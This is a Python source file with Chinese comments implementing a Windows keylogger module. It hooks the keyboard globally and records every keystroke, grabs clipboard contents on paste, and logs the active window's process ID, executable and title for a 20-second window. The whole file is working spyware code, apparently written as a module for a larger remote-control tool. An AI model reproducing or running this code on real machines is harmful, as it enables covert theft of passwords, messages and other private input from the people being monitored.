# -*- coding:utf-8 -*-
"""
作者：shinian
创建日期：2024/5/18 21:13
"""
import time
from ctypes import byref, create_string_buffer, c_ulong, windll

import pyWinhook as pyHook
import pythoncom
import win32clipboard

# 设置超时时间，单位为秒
TIMEOUT = 20 * 1


class Keylogger:
    def __init__(self):
        self.current_window = None
        self.log_messages = []  # 用于存储日志消息

    # 获取当前活动窗口的进程信息
    def get_current_process(self):
        # 获取当前活动窗口句柄
        hwnd = windll.user32.GetForegroundWindow()
        # 获取窗口进程ID
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'
        self.log_messages.append(f'pid is : {process_id}')

        # 获取窗口进程可执行文件名称
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        # 获取窗口标题
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            # 解码窗口标题，处理可能出现的编码问题
            self.current_window = window_title.value.decode('utf8', 'ignore')
        except UnicodeDecodeError as e:
            self.log_messages.append(f'{e}: window name unknown')

        # 打印进程信息
        self.log_messages.append(f'\n{process_id}, {executable.value.decode("utf-8")}, {self.current_window}')
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    # 处理按键事件的回调函数
    def myKeyStroke(self, event):
        # 如果当前窗口发生变化，则更新当前进程信息
        if event.WindowName != self.current_window:
            self.get_current_process()

        # 如果是可打印字符，则直接打印字符
        if 32 < event.Ascii < 127:
            self.log_messages.append(chr(event.Ascii))
        else:
            # 如果是特殊按键，则进行处理
            if event.Key == 'V':
                # 如果按下的是V键，则获取剪贴板内容并打印
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                self.log_messages.append(f'[PASTE] - {value}')
            else:
                # 打印按下的特殊键
                self.log_messages.append(event.Key)
        return True


def run():
    print("[*] In keylogger module")
    kl = Keylogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.myKeyStroke
    hm.HookKeyboard()

    # 循环监听按键事件，直到超时时间结束
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    return kl.log_messages  # 返回日志消息列表


if __name__ == '__main__':
    run()
    print('done.')
